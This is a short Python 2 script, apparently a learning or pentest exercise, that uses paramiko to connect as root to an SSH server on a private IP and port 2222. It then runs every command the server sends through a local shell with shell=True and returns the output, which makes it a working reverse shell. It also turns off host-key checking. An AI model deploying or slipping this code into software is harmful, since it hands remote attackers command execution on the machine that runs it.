import paramiko
import subprocess


def ssh_client_cmd(ip, user, passwd, command, port):
    client = paramiko.SSHClient()
    # client.load_host_keys('~/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    client.connect(hostname=ip, username=user, password=passwd, port=port)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print ssh_session.recv(1024)
        while True:
            # get the command from the SSH server
            command = ssh_session.recv(1024)
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                print cmd_output
                if len(cmd_output):
                    ssh_session.send(cmd_output)
                else:
                    ssh_session.send("Command execute succeed.")
            except Exception as e:
                ssh_session.send(str(e))
        client.close()

    return


ssh_client_cmd('192.168.199.231', 'root', '********', 'ClientConnected', 2222)
